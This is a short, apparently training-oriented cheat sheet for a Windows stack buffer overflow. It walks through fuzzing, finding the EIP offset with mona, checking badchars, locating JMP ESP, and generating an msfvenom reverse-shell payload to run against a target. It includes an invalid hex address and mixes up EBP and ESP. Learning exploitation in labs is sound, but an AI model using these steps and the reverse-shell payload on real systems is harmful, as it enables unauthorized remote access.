# Buffer-Overflow-Cheatsheet

In this cheat sheet is noted how we can perform an buffer overflow attack

Install Immunity Debugger this will be needed to perform the bugger overflow exploitation.
can be found on: https://www.immunityinc.com/

After installing Immunity debugger install Mona from: https://github.com/corelan/mona.
Put the .py file in the PyCommands folder (C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands. 
This module will be needed to determine the offset/ find the EIP.

## Fuzzing

After running the program on your Windows machine and have it attached to Immunity Debugger.
Run the fuzzer.py script to identify the point where the application will crash.

## Finding the Offset

After finding the crash point we want to find the Offset to the EIP adress.
To do this we can use the following script to generate a string.
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {bytes}`

To determine the EIP we can use the following mona command:

`!mona findesp -distance {used bytes}`

Put the EIP in the exploit.py script and verify that EIP has been overwritten with the character "B" (42 in hexa)


## Badchars

To identify badchars we will use mona.

Run the badchars.py script and put the output in the exploit.py script to run it against the application the identify the badchars.
Use `!mona config -set workingfolder c:\mona\%p` to set the working folder and use `!mona bytearray -b “\x00` and use the compare command to check the values
`!mona compare -f C:\mona\{machine_name}\bytearray.bin -A {ESP ADRESS}`


## JMP ESP

After filtering out the badchars of the application, we will idenfitfy the equivalent for the OPCODE JMP ESP for change the flow of the application to run our shellcode rewriting the stack from its base (EBP). To find the equivalent of the OPCODE JMP ESP we can use the following command: `!mona -r esp -cpb "\x00"`

After finding the EBP adress we need to convert this adress to littl-endian format to use it in our code like this:

`0x0804197R <-> "\x7R\x19\x04\x08"`


## Exploitation

We can now generator our payload to run against our victim machine inserting the badchars we found using mona.
`msfvenom -p windows/shell_reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a"`

The `EXITFUNC=thread` prevents the shellcode from crashing the application when executing our shellcode.

Now just insert the out in the `exploit.py` script and run it against the application to get a reverse shell. Dont forget to open a listener!
